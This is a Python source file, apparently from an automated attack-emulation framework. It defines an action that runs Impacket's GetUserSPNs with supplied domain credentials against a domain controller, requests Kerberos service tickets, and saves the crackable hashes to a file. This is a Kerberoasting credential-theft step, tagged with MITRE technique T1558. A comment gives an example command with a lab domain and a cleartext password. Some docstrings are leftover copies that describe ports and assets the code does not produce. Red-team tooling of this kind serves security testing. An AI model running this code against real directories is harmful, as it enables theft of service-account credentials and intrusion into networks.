from pathlib import Path
from typing import Any

from action_state_interface.action import Action, StateChangeSequence
from action_state_interface.action_utils import shell
from action_state_interface.exec import ActionExecutionResult
from artefacts.ArtefactManager import ArtefactManager
from kg_api import Entity, Pattern
from kg_api.query import Query
from motifs import ActionInputMotif, ActionOutputMotif
from Session import SessionManager


class ImpacketGetUserSPNs(Action):
    """
    ImpacketGetUserSPNs action that retrieves Service Principal Names (SPNs) for users in Active Directory.
    This action requires:
    - A User entity with domain, username, and credentials attributes
    - A ComputerAccount entity with is_domain_controller_account flag set to true and ip_address (provides the DC IP address)
    """

    def __init__(self):
        super().__init__("ImpacketGetUserSPNs", "T1558", "TA0006", [])
        self.noise = 0.3
        self.impact = 0.7
        self.input_motif = self.build_input_motif()
        self.output_motif = self.build_output_motif()

    @classmethod
    def build_input_motif(cls) -> ActionInputMotif:
        """
        Build the input motif for ImpacketGetUserSPNs.

        Query for Users entities and their associated ComputerAccounts using creds.

        Returns:
            ActionInputMotif: Input motif requiring related DomainPartition, ComputerAccount (controller=True) and Credentials entities
        """
        input_motif = ActionInputMotif(
            name="InputMotif_ImpacketGetUserSPNs",
            description="Input requirements for Impacket GetUserSPNs command",
        )
        input_motif.add_template(entity=Entity('DomainPartition', alias='domain'), template_name="existing_domain")
        input_motif.add_template(
            entity=Entity('ComputerAccount', alias='computer', controller=True),
            template_name="existing_account",
            match_on="existing_domain",
            relationship_type="belongs_to",
        )
        input_motif.add_template(
            entity=Entity('Credentials', alias='creds'),
            template_name="existing_creds",
            match_on="existing_domain",
            relationship_type="secured_with",
            invert_relationship=True,
        )
        return input_motif

    @classmethod
    def build_output_motif(cls) -> ActionOutputMotif:
        """
        Build the output motif templates for ImpacketGetUserSPNs.

        Defines templates for:
        - Discovered assets (linked to subnet via belongs_to relationship)
        - Open ports (linked to assets via has relationship)

        Returns:
            ActionOutputMotif: Output motif with asset and port templates
        """
        output_motif = ActionOutputMotif(
            name="impacketgetnpusers_output",
            description="Templates for fetched password hashes",
        )

        output_motif.add_template(
            entity=Entity('File', alias='file'),
            template_name="discovered_file",
            match_on=Entity('DomainPartition'),
            relationship_type='has',
            invert_relationship=True,
        )

        return output_motif

    def expected_outcome(self, pattern: Pattern) -> list[str]:
        """
        Return the expected outcome of the ImpacketGetUserSPNs action.
        """
        domain = pattern.get('domain').get('label')
        dc_ip = pattern.get('computer').get('ip_address')
        user = pattern.get('creds').get('username')
        return [
            f"Retrieve SPNs in domain {domain} via domain controller {dc_ip} using credentials for {user} and save to kerberoasting.hashes file"
        ]

    def get_target_query(self) -> Query:
        """
        Query for Users entities and their associated ComputerAccounts.
        """
        query = self.input_motif.get_query()
        query.ret_all()
        return query

    def function(self, sessions: SessionManager, artefacts: ArtefactManager, pattern: Pattern) -> ActionExecutionResult:
        """
        Execute GetUserSPNs command using the provided user credentials and domain controller IP.
        """
        creds = pattern.get('creds')
        computer_account = pattern.get('computer')
        domain = pattern.get('domain').get('label')
        username = creds.get('username')
        password = creds.get('password')
        dc_ip = computer_account.get('ip_address')

        # Create output file artefact
        output_filename = "kerberoasting.hashes"
        output_uuid = artefacts.placeholder(output_filename)
        output_path = artefacts.get_path(output_uuid)

        # Construct the GetUserSPNs command
        # Format: GetUserSPNs.py -request -dc-ip <DC_IP> <domain>/<username>:<password> -outputfile <output_file>
        # Example: GetUserSPNs.py -request -dc-ip 192.168.56.11 north.sevenkingdoms.local/brandon.stark:iseedeadpeople -outputfile kerberoasting.hashes
        command_args = [
            "-request",
            "-dc-ip",
            dc_ip,
            f"{domain}/{username}:{password}",
            "-outputfile",
            str(output_path),
        ]
        exec_result = shell("impacket-GetUserSPNs", command_args)

        if exec_result.exit_status != 0:
            return exec_result

        # Check for errors in stdout/stderr even if exit_status is 0
        # GetUserSPNs.py returns errors in output but doesn't change exit status
        error_indicators = [
            "Error in bindRequest",
            "Error in searchRequest",
            "invalidCredentials",
            "referral:",
            "Connection timed out",
            "[-] Error",
            "[-] [Errno ",
        ]

        output_text = (exec_result.stdout or "") + (exec_result.stderr or "")
        if any(error in output_text for error in error_indicators):
            # Create a failed execution result
            return ActionExecutionResult(
                command=command_args,
                stdout=exec_result.stdout,
                stderr=exec_result.stderr,
                exit_status=1,
                logs=[f"ImpacketGetUserSPNs command failed with error: {output_text}"],
            )

        # Add the output file to artefacts
        exec_result.artefacts["kerberoasting_hashes"] = output_uuid
        return exec_result

    def populate_output_motif(self, pattern: Pattern, discovered_data: dict[str, list[str]]) -> StateChangeSequence:
        """
        Placeholder implementation for actions not using the new architecture.
        """
        self.output_motif.reset_context()
        domain = pattern.get('domain')
        changes: StateChangeSequence = []

        if not discovered_data:
            return changes

        output_path = str(discovered_data.get("output_path"))

        file = self.output_motif.instantiate(
            "discovered_file",
            match_on_override=domain,
            name="kerberoasting.hashes",
            file_type="kerberoasting_hashes",
            location=output_path,
        )
        changes.append(file)

        return changes

    def capture_state_change(
        self, artefacts: ArtefactManager, pattern: Pattern, output: ActionExecutionResult
    ) -> StateChangeSequence:
        """
        Capture state changes from the ImpacketGetUserSPNs execution.
        This could involve parsing the output file and updating the knowledge graph with discovered kerberos hashes.
        """
        changes: StateChangeSequence = []

        # If the command failed, don't process any state changes
        if output.exit_status != 0:
            return changes

        # Get the output file path
        if "kerberoasting_hashes" in output.artefacts:
            output_uuid = output.artefacts["kerberoasting_hashes"]
            output_path = artefacts.get_path(output_uuid)

            # Check if the file was created and has content
            if Path(output_path).exists() and Path(output_path).stat().st_size > 0:
                changes = self.populate_output_motif(pattern, {"output_path": output_path})

        return changes

    def parse_output(self, output: ActionExecutionResult) -> dict[str, Any]:
        """
        Placeholder implementation for actions not using the new architecture.
        """
        return {}
